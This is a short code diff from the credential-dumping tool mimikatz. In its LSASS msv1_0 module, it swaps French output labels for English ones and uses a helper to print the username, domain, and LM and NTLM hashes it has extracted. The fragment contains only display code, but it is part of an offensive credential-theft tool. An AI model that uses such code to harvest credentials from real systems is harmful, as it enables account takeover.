@@ -195,13 +195,11 @@ bool mod_mimikatz_sekurlsa_msv1_0::decryptAndDisplayCredsBlock(LSA_UNICODE_STRIN
 				wcout << L"lm{ " << lmHash << L" }, ntlm{ " << ntHash << L" }";
 			else
 			{
-				wstring userName(mesCreds->UserName.Buffer, mesCreds->UserName.Length / sizeof(wchar_t));
-				wstring domainName(mesCreds->LogonDomainName.Buffer, mesCreds->LogonDomainName.Length / sizeof(wchar_t));
 				wcout << endl <<
-					L"\t * Utilisateur  : " << userName << endl <<
-					L"\t * Domaine      : " << domainName << endl <<
-					L"\t * Hash LM      : " << lmHash << endl <<
-					L"\t * Hash NTLM    : " << ntHash;
+					L"\t * User         : " << mod_text::stringOfSTRING(mesCreds->UserName) << endl <<
+					L"\t * Domain       : " << mod_text::stringOfSTRING(mesCreds->LogonDomainName) << endl <<
+					L"\t * LM Hash      : " << lmHash << endl <<
+					L"\t * NTLM Hash    : " << ntHash;
 			}
 		} else wcout << L"n.e. (Lecture Block Credentials KO)";
 
